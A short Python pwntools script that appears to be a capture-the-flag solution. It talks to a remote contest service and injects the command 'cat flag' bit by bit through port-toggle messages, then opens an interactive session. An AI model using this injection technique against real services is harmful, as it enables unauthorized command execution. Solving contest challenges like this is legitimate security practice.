from pwn import *
import struct

r = remote("pnbnc.forfuture.fluxfingers.net", 11111)

DOORPORT = 0x8000000
MAINPORT = 0x10000

tbl = []
bit = [0, 0, 0, 0, 0, 0, 0, 0]

def write_chr(c):
    dat = p32(DOORPORT)
    for i in range(8):
        if ((ord(c) >> (7 - i)) & 1) != bit[i]:
            dat += p16(tbl[i])
            bit[i] ^= 1
        else:
            dat += p16(0)
    print bit

    r.send(dat + p32(MAINPORT) + p8(0b0001))
    r.recvuntil('i\xf2')

r.send(p32(MAINPORT) + p8(0b1000))
tbl = struct.unpack("<HHHHHHHH", r.recv(16))

target = 'cat flag'
for i in target:
    write_chr(i)
r.send(p32(MAINPORT) + p8(0b0100))

r.interactive()